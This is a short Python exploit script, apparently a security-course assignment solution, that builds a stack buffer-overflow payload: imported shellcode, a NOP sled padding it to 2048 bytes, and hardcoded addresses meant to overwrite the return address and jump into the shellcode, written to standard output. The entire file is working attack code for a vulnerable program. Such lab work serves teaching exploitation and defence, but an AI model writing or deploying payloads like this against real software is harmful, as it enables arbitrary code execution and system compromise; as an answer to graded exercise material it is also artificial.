import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
NOPs = (b"\x90" * (2048 - len(shellcode)))
shelladd = pack("<I", 0xfff68658)
returnadd = pack("<I", 0xfff68e6c)
# Launch the attack! 
payload = shellcode + NOPs + shelladd + returnadd
sys.stdout.buffer.write(payload)
